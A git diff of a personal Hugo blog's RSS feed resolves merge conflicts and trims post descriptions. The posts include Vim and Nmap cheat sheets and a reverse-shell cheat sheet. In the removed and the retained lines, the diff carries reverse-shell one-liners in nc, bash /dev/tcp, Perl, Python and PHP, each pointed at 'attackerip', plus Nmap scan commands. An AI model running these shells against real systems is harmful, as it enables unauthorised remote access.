@@ -17,14 +17,7 @@
       <pubDate>Thu, 02 Jul 2020 17:36:48 +0800</pubDate>
       
       <guid>https://hare001.github.io/about/</guid>
-<<<<<<< HEAD
-      <description>Written in Go, Hugo is an open source static site generator available under the Apache Licence 2.0. Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.
-Hugo makes use of a variety of open source projects including:
- https://github.com/yuin/goldmark https://github.com/alecthomas/chroma https://github.com/muesli/smartcrop https://github.com/spf13/cobra https://github.com/spf13/viper  Hugo is ideal for blogs, corporate websites, creative portfolios, online magazines, single page applications or even a website with thousands of pages.
-Hugo is for people who want to hand code their own website without worrying about setting up complicated runtimes, dependencies and databases.</description>
-=======
       <description></description>
->>>>>>> f00a4d10143bda514c4168bf395f69705a632acc
     </item>
     
     <item>
@@ -33,9 +26,6 @@ Hugo is for people who want to hand code their own website without worrying abou
       <pubDate>Wed, 01 Jul 2020 17:32:10 +0800</pubDate>
       
       <guid>https://hare001.github.io/2020/vim-cheat-sheet/</guid>
-<<<<<<< HEAD
-      <description>全局 :h[elp] 关键字 - 打开关键字帮助 :sav[eas] 文件名 - 另存为 :clo[se] - 关闭当前窗口 :ter[minal] - open a terminal window K - 打开光标所在单词的man页面 移动光标 h - 左移光标 j - 下移光标 k - 上移光标 l - 右移光标 H - 移动到当前页面顶部 M - 移动到当前页面</description>
-=======
       <description>&lt;h3 id=&#34;全局&#34;&gt;全局&lt;/h3&gt;
 &lt;pre&gt;&lt;code&gt;:h[elp] 关键字 - 打开关键字帮助
 :sav[eas] 文件名 - 另存为
@@ -43,7 +33,6 @@ Hugo is for people who want to hand code their own website without worrying abou
 :ter[minal] - open a terminal window
 K - 打开光标所在单词的man页面
 &lt;/code&gt;&lt;/pre&gt;</description>
->>>>>>> f00a4d10143bda514c4168bf395f69705a632acc
     </item>
     
     <item>
@@ -52,9 +41,6 @@ K - 打开光标所在单词的man页面
       <pubDate>Wed, 01 Jul 2020 17:27:34 +0800</pubDate>
       
       <guid>https://hare001.github.io/2020/nmap-cheat-sheet/</guid>
-<<<<<<< HEAD
-      <description>Nmap Target Selection #Scan a single IPnmap 192.168.1.1#Scan a hostnmap www.testhostname.com#Scan a range of IPsnmap 192.168.1.1-20#Scan a subnetnmap 192.168.1.0/24#Scan targets from a text filenmap -iL list-of-ips.txt Nmap Port Selection #Scan a single Portnmap -p 22 192.168.1.1#Scan a range of portsnmap -p 1-100 192.168.1.1#Scan 100 most common ports (Fast)nmap -F 192.168.1.1#Scan all 65535 portsnmap -p- 192.168.1.1 Nmap Port Scan types #Scan using TCP connectnmap -sT 192.168.1.1#Scan using TCP SYN scan (default)nmap -sS 192.168.1.1#Scan UDP portsnmap -sU -p 123,161,162 192.</description>
-=======
       <description>&lt;h3 id=&#34;nmap-target-selection&#34;&gt;Nmap Target Selection&lt;/h3&gt;
 &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#Scan a single IP
 nmap 192.168.1.1
@@ -67,7 +53,6 @@ nmap 192.168.1.0/24
 #Scan targets from a text file
 nmap -iL list-of-ips.txt
 &lt;/code&gt;&lt;/pre&gt;</description>
->>>>>>> f00a4d10143bda514c4168bf395f69705a632acc
     </item>
     
     <item>
@@ -76,9 +61,6 @@ nmap -iL list-of-ips.txt
       <pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate>
       
       <guid>https://hare001.github.io/2020/reverse-shell-cheat-sheet/</guid>
-<<<<<<< HEAD
-      <description>利用 nc 监听端口 nc -lvp 2333 nc 版本： nc -e /bin/sh attackerip 2333 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip 2333 &amp;gt;/tmp/f nc attackerip 8888|/bin/sh|nc attackerip 9999 Bash 版本： bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 0&amp;gt;&amp;amp;1 bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 &amp;lt;&amp;amp;2 exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/2333;cat &amp;lt;&amp;amp;5|while read line;do $line &amp;gt;&amp;amp;5 2&amp;gt;&amp;amp;1;done 0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196 mknod backpipe p; nc attackerip 2333 0&amp;lt;backpipe | /bin/bash 1&amp;gt;backpipe 2&amp;gt;backpipe Perl 版本: perl -e &#39;use Socket;$i=&amp;quot;attackerip&amp;quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39; Python 版本： python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;attackerip&amp;quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39; php 版本： php -r &#39;$sock=fsockopen(&amp;quot;attackerip&amp;quot;,2333);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3</description>
-=======
       <description>&lt;h2 id=&#34;利用-nc-监听端口&#34;&gt;利用 nc 监听端口&lt;/h2&gt;
 &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -lvp 2333
 &lt;/code&gt;&lt;/pre&gt;
@@ -89,7 +71,6 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip 
 
 nc attackerip 8888|/bin/sh|nc attackerip 9999
 &lt;/code&gt;&lt;/pre&gt;</description>
->>>>>>> f00a4d10143bda514c4168bf395f69705a632acc
     </item>
     
   </channel>
